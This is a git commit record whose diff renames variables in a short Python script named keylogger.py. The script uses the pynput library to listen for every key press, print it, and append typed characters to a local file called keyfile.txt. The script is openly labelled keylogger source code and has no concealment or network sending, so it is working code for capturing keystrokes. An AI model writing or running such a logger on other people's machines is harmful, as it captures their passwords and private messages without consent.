86d9b93b44d30a6cd02a224aa9a0b7b1f1f2820d
Shruthi5ch <138290030+Shruthi5ch@users.noreply.github.com>
2024-10-12 15:57:49 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,15 @@
 from pynput import keyboard
 
-def keyPressed(key):
+def keyPress(key):
     print(str(key))
     with open("keyfile.txt", 'a') as logKey:
         try:
-            char = key.char
-            logKey.write(char)
+            ch= key.char
+            logKey.write(ch)
         except:
             print("Error getting char")
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
+    listen = keyboard.Listener(on_press=keyPress)
+    listen.start()
     input()
